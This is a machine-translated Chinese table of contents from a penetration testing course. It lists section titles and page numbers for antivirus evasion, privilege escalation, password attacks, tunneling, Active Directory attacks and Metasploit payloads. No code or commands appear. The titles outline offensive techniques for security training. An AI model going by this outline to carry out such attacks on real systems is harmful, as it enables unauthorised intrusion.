<div style="position:absolute;top:12935;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.5 使用 TFTP 上传文件 ..................................... …………………………………………………………………………………………………………………………………………………………………… .. 488</font></font></nobr></div>
<div style="position:absolute;top:12962;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 489</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12989;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒规避 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 490</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13016;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">什么是杀毒软件 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ………… 490</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13042;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测恶意代码的方法 ..................................... ...................................... 490</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13069;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2.1 基于签名的检测 ..................................... …………………………………………………………………………………………………………………………………………………………………… . 491</font></font></nobr></div>
<div style="position:absolute;top:13096;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2.2 启发式和基于行为的检测 ..................................... ...................................... 492 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13372;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过防病毒检测 ..................................... ………………………………………………………………………………………………………………………………………………………… . 492</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13399;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1 磁盘规避 ..................................... ...................................................... …………………… 493</font></font></nobr></div>
<div style="position:absolute;top:13425;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2 内存中规避 ..................................... ...................................................... …………………… 494</font></font></nobr></div>
<div style="position:absolute;top:13452;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3 AV 规避：实际示例 ..................................... ...................................................... 495</font></font></nobr></div>
<div style="position:absolute;top:13479;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 511</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13506;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限提升 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 512</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13533;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 512</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13560;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1 手动枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 512</font></font></nobr></div>
<div style="position:absolute;top:13586;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.2 自动枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 535</font></font></nobr></div>
<div style="position:absolute;top:13613;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 权限提升示例 ..................................................... ...................................... 538</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13640;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.1 了解 Windows 权限和完整性级别 ..................................................... .. 538</font></font></nobr></div>
<div style="position:absolute;top:13667;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.2 用户账户控制（UAC）简介 ..................................... ...................... 539</font></font></nobr></div>
<div style="position:absolute;top:13694;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.3 用户帐户控制 (UAC) 绕过：fodhelper.exe 案例研究 ................................................. 542</font></font></nobr></div>
<div style="position:absolute;top:13721;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.4 不安全的文件权限：Serviio 案例研究 ..................................... ...................... 555</font></font></nobr></div>
<div style="position:absolute;top:13748;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.5 利用未引用的服务路径 ..................................... ...................................... 559</font></font></nobr></div>
<div style="position:absolute;top:13774;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.6 Windows 内核漏洞：USBPcap 案例研究 ..................................... ...... 560</font></font></nobr></div>
<div style="position:absolute;top:13801;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 提权示例 ..................................... ...................................................... 565</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13828;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.1 了解 Linux 权限 ..................................... ...................................................... 565</font></font></nobr></div>
<div style="position:absolute;top:13855;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.2 不安全的文件权限：Cron 案例研究 ..................................... ...................... 566</font></font></nobr></div>
<div style="position:absolute;top:13882;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.3 不安全的文件权限：/etc/passwd 案例研究 ..................................... ……………… 567</font></font></nobr></div>
<div style="position:absolute;top:13909;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.4 内核漏洞：CVE-2017-1000112 案例研究 ..................................... ........ 568</font></font></nobr></div>
<div style="position:absolute;top:13935;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 570</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13962;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码攻击 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 572</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:13989;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.1 词表</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 572</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14016;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.1.1 标准词表 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 573</font></font></nobr></div>
<div style="position:absolute;top:14043;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力词表 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 575</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14069;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常见的网络服务攻击方法 ..................................... ...................................... 578</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14096;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.1 使用 Medusa 进行 HTTP htaccess 攻击 ..................................... ...................................... 579</font></font></nobr></div>
<div style="position:absolute;top:14123;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.2 使用 Crowbar 进行远程桌面协议攻击 ..................................... ……………… 581</font></font></nobr></div>
<div style="position:absolute;top:14150;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.3 使用 THC-Hydra 进行 SSH 攻击 ..................................... …………………………………………………………………………………………………………………………………………………………………… . 582</font></font></nobr></div>
<div style="position:absolute;top:14177;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.4 THC-Hydra 的 HTTP POST 攻击 ..................................... ...................................... 583</font></font></nobr></div>
<div style="position:absolute;top:14204;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用密码哈希...................................................... …………………………………………………………………………………………………………………………………………………………………… . 586</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14230;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.1 检索密码哈希...................................................... ...................................................... 586</font></font></nobr></div>
<div style="position:absolute;top:14257;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.2 在 Windows 中传递 Hash ...................................... ...................................................... 590</font></font></nobr></div>
<div style="position:absolute;top:14284;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.3 密码破解 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 592 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14560;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 595</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14587;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口重定向和隧道...................................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ...... 596</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14613;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口转发 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 596</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14640;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.1.1 RINETD ..................................... ...................................................... ...................................... 596</font></font></nobr></div>
<div style="position:absolute;top:14667;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 隧道 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 600</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14694;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.1 SSH 本地端口转发 ..................................... …………………………………………………………………………………………………………………………………………………………………… 600</font></font></nobr></div>
<div style="position:absolute;top:14721;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.2 SSH 远程端口转发 ..................................... ...................................................... 604</font></font></nobr></div>
<div style="position:absolute;top:14748;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.3 SSH 动态端口转发 ..................................... ...................................................... 606</font></font></nobr></div>
<div style="position:absolute;top:14774;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.3 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PLINK.exe ...................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 610</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14801;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.4 网信</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..................................... ...................................................... ...................................................... 613</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14828;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过深度数据包检测的 HTTPTunnel-ing ..................................... …………………… 616</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14855;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.6</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 621</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14882;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 攻击 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 622</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14909;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动目录理论 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 622</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14936;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 枚举 ..................................... ...................................................... ... 623</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:14962;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.1 传统方法 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 624</font></font></nobr></div>
<div style="position:absolute;top:14989;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.2 现代方法 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 626</font></font></nobr></div>
<div style="position:absolute;top:15016;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.3 解决嵌套组 ..................................... ………………………………………………………………………………………………………………………………………………………… .. 632</font></font></nobr></div>
<div style="position:absolute;top:15043;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.4 当前登录用户 ..................................... …………………………………………………………………………………………………………………………………………………………………… . 635</font></font></nobr></div>
<div style="position:absolute;top:15070;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.5 通过服务主体名称枚举...................................................... ...................... 638</font></font></nobr></div>
<div style="position:absolute;top:15097;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动目录认证 ..................................... ...................................................... 642</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15123;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.1 NTLM 认证 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 642</font></font></nobr></div>
<div style="position:absolute;top:15150;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.2 Kerberos 认证 ..................................... ...................................................... ... 644</font></font></nobr></div>
<div style="position:absolute;top:15177;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.3 缓存凭证存储和检索 ..................................... ...................................... 647</font></font></nobr></div>
<div style="position:absolute;top:15204;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.4 服务账户攻击...................................................... …………………………………………………………………………………………………………………………………………………………………… .... 651</font></font></nobr></div>
<div style="position:absolute;top:15231;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.5 低速和慢速密码猜测 ..................................................... ...................................... 654</font></font></nobr></div>
<div style="position:absolute;top:15257;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 横向移动 ..................................... ...................................................... 656</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15284;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.1 传递 Hash ............................................................ …………………………………………………………………………………………………………………………………………………………………… ...................... 657</font></font></nobr></div>
<div style="position:absolute;top:15311;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.2 超越 Hash ............................................................ …………………………………………………………………………………………………………………………………………………………………… ……………… 658</font></font></nobr></div>
<div style="position:absolute;top:15338;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.3 通票 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 662</font></font></nobr></div>
<div style="position:absolute;top:15365;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.4 分布式组件对象模型 ..................................... ...................................... 665</font></font></nobr></div>
<div style="position:absolute;top:15392;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 持久性 ..................................... ………………………………………………………………………………………………………………………………………………………… …… 671</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15418;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5.1 金票 ..................................... …………………………………………………………………………………………………………………………………………………………………… …………………… 671</font></font></nobr></div>
<div style="position:absolute;top:15445;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5.2 域控制器同步 ..................................... ...................................... 675</font></font></nobr></div>
<div style="position:absolute;top:15472;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.6</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 677</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15748;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架 ..................................... …………………………………………………………………………………………………………………………………………………………………… ………… 678</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15775;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 用户界面和设置 ..................................... ...................................... 679</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15801;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.1 熟悉 MSF 语法 ..................................... ...................................... 679</font></font></nobr></div>
<div style="position:absolute;top:15828;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.2 Metasploit 数据库访问 ..................................... ...................................................... 681</font></font></nobr></div>
<div style="position:absolute;top:15855;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.3 辅助模块 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 683</font></font></nobr></div>
<div style="position:absolute;top:15882;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用模块 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 688</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15909;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.2.1 SyncBreeze 企业版 ..................................... ………………………………………………………………………………………………………………………………………………………… ....... 689</font></font></nobr></div>
<div style="position:absolute;top:15936;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 有效载荷 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ……………… 692</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:15962;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.1 分阶段与非分阶段有效载荷 ..................................... ...................................................... 692</font></font></nobr></div>
<div style="position:absolute;top:15989;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.2 Meterpreter 有效载荷 ..................................... …………………………………………………………………………………………………………………………………………………………………… ........ 693</font></font></nobr></div>
<div style="position:absolute;top:16016;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.3 使用 Meterpreter 进行试验 ..................................... ...................................................... 694</font></font></nobr></div>
<div style="position:absolute;top:16043;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.4 可执行有效载荷 ..................................... …………………………………………………………………………………………………………………………………………………………………… ………… 696</font></font></nobr></div>
<div style="position:absolute;top:16070;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.5 Metasploit Exploit Multi Handler ..................................... ...................................... 698</font></font></nobr></div>
<div style="position:absolute;top:16097;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.6 客户端攻击 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 701</font></font></nobr></div>
<div style="position:absolute;top:16124;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.7 高级特性和传输 ..................................... ...................................... 702</font></font></nobr></div>
<div style="position:absolute;top:16150;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建我们自己的 MSF 模块 ..................................... …………………………………………………………………………………………………………………………………………………………………… .. 706</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16177;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Metasploit 进行后期开发 ..................................... ...................................................... 711</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16204;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.1 核心后开发特性 ..................................... ...................................................... 711</font></font></nobr></div>
<div style="position:absolute;top:16231;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.2 迁移进程 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 712</font></font></nobr></div>
<div style="position:absolute;top:16258;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.3 后开发模块 ..................................... …………………………………………………………………………………………………………………………………………………………………… .. 713</font></font></nobr></div>
<div style="position:absolute;top:16285;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.4 使用 Metasploit 框架进行旋转 ..................................... ...................................... 716</font></font></nobr></div>
<div style="position:absolute;top:16311;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.6 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 自动化 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 721</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16338;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.7</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 723</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16365;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 帝国 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 724</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16392;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装、设置和使用 ..................................... …………………………………………………………………………………………………………………………………………………………………… …… 724</font></font><font style="font-size:16px">	</font></nobr></div>
